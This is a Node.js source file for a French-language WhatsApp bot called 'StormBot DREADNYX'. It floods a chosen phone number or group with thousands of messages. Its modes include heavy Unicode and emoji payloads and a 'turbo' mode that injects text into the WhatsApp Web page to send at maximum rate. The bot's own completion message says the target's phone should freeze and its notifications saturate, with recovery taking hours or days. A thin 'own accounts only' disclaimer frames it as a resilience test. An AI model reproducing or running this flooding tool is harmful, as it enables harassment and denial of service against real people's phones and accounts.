#!/usr/bin/env node
/**
 * ============================================================
 *  StormBot DREADNYX — Testeur de résilience WhatsApp (message storm)
 * ============================================================
 *  ⚠️ Usage autorisé UNIQUEMENT sur vos propres comptes/numéros
 *  et vos propres groupes (numéros de test dédiés).
 *
 *  Commandes (envoyées dans le chat avec le bot) :
 *    !status                          → état du bot
 *    !storm <numéro> [nb]             → inondation texte rapide (défaut: 5000)
 *    !storm -u <numéro> [nb]          → inondation + payloads Unicode/emojis lourds
 *    !storm -t <numéro> [nb]          → mode TURBO (injection DOM, débit max)
 *    !groupstorm <nom> [nb]           → inondation d'un groupe (le vôtre)
 *    !stop                            → interrompt tout
 */

const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const CONFIG = require('./config');
const { heavyPayloads, emojiPayload } = require('./payloads');

// ---------------- Gestion des erreurs non capturées ----------------
process.on('unhandledRejection', (err) => {
    console.error(`[${ts()}] Rejet non géré :`, err);
});
process.on('uncaughtException', (err) => {
    console.error(`[${ts()}] Exception non capturée :`, err);
    process.exit(1);
});

// ---------------- État global ----------------
let stormActive = false;
let abortRequested = false;
const stats = { sent: 0, errors: 0, startTime: null };

const ts = () => new Date().toLocaleTimeString('fr-FR');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------------- Client ----------------
// headless:'new' par défaut : fonctionne sur un VPS/panel sans écran.
// Mettez HEADLESS=false en variable d'environnement pour une fenêtre visible.
const headless = process.env.HEADLESS !== 'false';
const client = new Client({
    authStrategy: new LocalAuth({ clientId: CONFIG.sessionName }),
    puppeteer: {
        headless: headless ? 'new' : false,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu'
        ],
        executablePath: process.env.CHROME_PATH || undefined,
    },
});

client.on('qr', (qr) => {
    qrcode.generate(qr, { small: true });
    console.log(`[${ts()}] 📱 Scannez le QR code (session: ${CONFIG.sessionName})`);
});

client.on('authenticated', () => console.log(`[${ts()}] 🔑 Session authentifiée`));
client.on('ready', () => console.log(`[${ts()}] ✅ Bot connecté — envoyez !status dans votre chat`));
client.on('auth_failure', (m) => console.error(`[${ts()}] ❌ Auth échouée: ${m}`));
client.on('disconnected', (r) => console.log(`[${ts()}] ⚠️ Déconnecté: ${r}`));

// ---------------- Envoi avec retry (gère le throttling du bot) ----------------
async function sendWithRetry(chat, text, retries = 2) {
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            await chat.sendMessage(text);
            return true;
        } catch (e) {
            if (attempt < retries) {
                await sleep(1500 * (attempt + 1)); // backoff
            } else {
                stats.errors++;
            }
        }
    }
    return false;
}

// ---------------- Commande !storm ----------------
function parseArgs(args) {
    let mode = 'text';
    const filtered = [];
    for (const a of args) {
        if (a === '-u') mode = 'unicode';
        else if (a === '-t') mode = 'turbo';
        else filtered.push(a);
    }
    const number = (filtered[0] || '').replace(/[^0-9]/g, '');
    const count = parseInt(filtered[1]) || 5000;
    return { mode, number, count };
}

async function handleStormCommand(msg, args) {
    const { mode, number, count } = parseArgs(args);

    if (number.length < 8 || number.length > 15) {
        return msg.reply('❌ Numéro invalide. Format: !storm 243842068939 [nb]');
    }
    if (count > CONFIG.maxMessages) {
        return msg.reply(`❌ Max autorisé: ${CONFIG.maxMessages} messages`);
    }
    if (stormActive) {
        return msg.reply('❌ Un storm est déjà en cours (utilisez !stop)');
    }
    if (CONFIG.allowedTargets.length && !CONFIG.allowedTargets.includes(number)) {
        return msg.reply('❌ Numéro non autorisé dans config.js (allowedTargets)');
    }

    await msg.reply(
        `⚡ Lancement du storm vers +${number}\n` +
        `• Mode: ${mode}\n• Messages: ${count}\n` +
        `Répondez !stop pour interrompre.`
    );

    try {
        const chat = await client.getChatById(`${number}@c.us`);
        await runStorm(chat, count, mode, msg);
    } catch (e) {
        await msg.reply(`❌ Impossible d'ouvrir le chat +${number}: ${e.message}\nCe numéro est-il sur WhatsApp ?`);
    }
}

// ---------------- Commande !groupstorm ----------------
async function handleGroupStormCommand(msg, args) {
    const namePart = (args[0] || '').toLowerCase();
    const count = parseInt(args[1]) || 3000;

    if (!namePart) return msg.reply('❌ Format: !groupstorm <nom_du_groupe> [nb]');
    if (count > CONFIG.maxMessages) return msg.reply(`❌ Max autorisé: ${CONFIG.maxMessages} messages`);
    if (stormActive) return msg.reply('❌ Un storm est déjà en cours (utilisez !stop)');

    const chats = await client.getChats();
    const group = chats.find((c) => c.isGroup && c.name.toLowerCase().includes(namePart));

    if (!group) {
        return msg.reply(`❌ Groupe "${namePart}" introuvable. Le bot doit être membre du groupe.`);
    }
    if (CONFIG.allowedGroups.length && !CONFIG.allowedGroups.includes(group.id._serialized)) {
        return msg.reply('❌ Groupe non autorisé dans config.js (allowedGroups)');
    }

    await msg.reply(`⚡ Lancement du storm sur le groupe "${group.name}" (${count} messages)`);
    await runStorm(group, count, 'text', msg);
}

// ---------------- Moteur de storm ----------------
async function runStorm(chat, count, mode, controlMsg) {
    stormActive = true;
    abortRequested = false;
    stats.sent = 0;
    stats.errors = 0;
    stats.startTime = Date.now();

    try {
        await chat.sendMessage('⚡ Storm de test — début');

        if (mode === 'turbo') {
            await turboStorm(chat, count, controlMsg);
            return; // finally fera le ménage
        }

        const heavy = heavyPayloads;

        for (let i = 0; i < count; i += CONFIG.batchSize) {
            if (abortRequested) break;

            const batch = [];
            for (let j = 0; j < CONFIG.batchSize && i + j < count; j++) {
                const n = i + j;
                let text;

                if (mode === 'unicode' && n % 7 === 6) {
                    text = heavy[n % heavy.length];       // 1 payload lourd / 7
                } else if (mode === 'unicode' && n % 7 === 5) {
                    text = emojiPayload();                // emojis en masse
                } else {
                    text = `s${Math.floor(Math.random() * 1e9)}${Date.now().toString(36)}`;
                }

                batch.push(sendWithRetry(chat, text));
            }

            await Promise.all(batch);
            stats.sent += batch.length;

            if (stats.sent % 1000 === 0) {
                const rate = (stats.sent / ((Date.now() - stats.startTime) / 1000)).toFixed(0);
                await controlMsg.reply(`[*] ${stats.sent}/${count} envoyés (${rate} msg/s)`);
            }

            await sleep(CONFIG.batchDelayMs);
        }

        // Rafale finale de payloads lourds — test du renderer
        if (!abortRequested) {
            await controlMsg.reply('[*] Injection des payloads lourds de fin...');
            for (let k = 0; k < CONFIG.heavyPayloadCount; k++) {
                await sendWithRetry(chat, heavy[k % heavy.length]);
                await sleep(50);
            }
            stats.sent += CONFIG.heavyPayloadCount;
        }

        await reportDone(controlMsg);
    } catch (e) {
        await controlMsg.reply(`❌ Storm interrompu: ${e.message}`);
    } finally {
        stormActive = false;
        abortRequested = false;
    }
}

function reportDone(controlMsg) {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    return controlMsg.reply(
        `✅ Storm terminé\n` +
        `• Envoyés: ${stats.sent} (dont ${stats.errors} erreurs)\n` +
        `• Durée: ${elapsed.toFixed(1)}s\n` +
        `• Débit moyen: ${(stats.sent / elapsed).toFixed(0)} msg/s\n\n` +
        `📱 Sur le compte cible : gel/ANR attendu + saturation des notifications. ` +
        `Récupération : attendre le drain (heures/jours), ou WhatsApp Web → bloquer le bot → supprimer la conversation.`
    );
}

// ---------------- Mode TURBO (injection DOM directe) ----------------
async function turboStorm(chat, count, controlMsg) {
    const page = client.pupPage;
    if (!page) {
        await controlMsg.reply('❌ pupPage indisponible — version whatsapp-web.js incompatible (utilisez la 1.x)');
        return;
    }

    // Ouvrir la conversation dans l'UI WhatsApp Web
    try {
        const searchBox = await page.waitForSelector(CONFIG.selectors.searchBox, { timeout: 8000 });
        await searchBox.click();
        await page.type(CONFIG.selectors.searchBox, chat.id.user, { delay: 30 });
        await sleep(1500);
        await page.keyboard.press('Enter');
        await sleep(1500);
        await page.waitForSelector(CONFIG.selectors.messageInput, { timeout: 5000 });
    } catch (e) {
        await controlMsg.reply('⚠️ Impossible d\'ouvrir le chat automatiquement — ouvrez-le manuellement dans la fenêtre Chrome.');
        return;
    }

    const start = Date.now();

    for (let i = 0; i < count; i++) {
        if (abortRequested) break;

        const text = `s${Math.floor(Math.random() * 1e9)}`;
        const ok = await page.evaluate((t, sel) => {
            const input = document.querySelector(sel);
            if (!input) return false;

            input.focus();
            // execCommand déclenche les écouteurs React de WhatsApp Web
            document.execCommand('insertText', false, t);

            // Simuler la touche Entrée
            const opts = { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true, cancelable: true };
            input.dispatchEvent(new KeyboardEvent('keydown', opts));
            input.dispatchEvent(new KeyboardEvent('keypress', opts));
            input.dispatchEvent(new KeyboardEvent('keyup', opts));
            return true;
        }, text, CONFIG.selectors.messageInput);

        if (ok) stats.sent++;

        if (stats.sent % 2000 === 0) {
            const rate = (stats.sent / ((Date.now() - start) / 1000)).toFixed(0);
            await controlMsg.reply(`[⚡TURBO] ${stats.sent}/${count} (${rate} msg/s)`);
        }
        await sleep(CONFIG.turboDelayMs);
    }

    const elapsed = (Date.now() - start) / 1000;
    await controlMsg.reply(
        `✅ Storm TURBO terminé\n• Envoyés: ${stats.sent} en ${elapsed.toFixed(1)}s\n` +
        `• Débit: ${(stats.sent / elapsed).toFixed(0)} msg/s`
    );
}

// ---------------- Routeur de commandes ----------------
client.on('message', async (msg) => {
    try {
        const body = msg.body.trim();
        if (!body.startsWith('!')) return;

        const parts = body.split(/\s+/);
        const cmd = parts[0].toLowerCase();

        switch (cmd) {
            case '!status':
                await msg.reply(
                    `🤖 StormBot DREADNYX v2.0\n` +
                    `• État: ${stormActive ? '🟢 Storm en cours' : '⚪ Inactif'}\n` +
                    `• Session: ${CONFIG.sessionName}\n` +
                    `• Commandes: !storm, !groupstorm, !status, !stop`
                );
                break;

            case '!stop':
                if (stormActive) {
                    abortRequested = true;
                    await msg.reply('⏹️ Arrêt demandé...');
                } else {
                    await msg.reply('⚪ Aucun storm en cours');
                }
                break;

            case '!storm':
                await handleStormCommand(msg, parts.slice(1));
                break;

            case '!groupstorm':
                await handleGroupStormCommand(msg, parts.slice(1));
                break;

            default:
                await msg.reply(`❓ Commande inconnue: ${cmd}\nUtilisez !status pour la liste des commandes.`);
        }
    } catch (e) {
        console.error(`[${ts()}] Erreur:`, e.message);
        try { await msg.reply(`⚠️ Erreur: ${e.message}`); } catch (_) {}
    }
});

client.initialize().catch((e) => {
    console.error(`[${ts()}] Échec d'initialisation:`, e.message);
    process.exit(1);
});
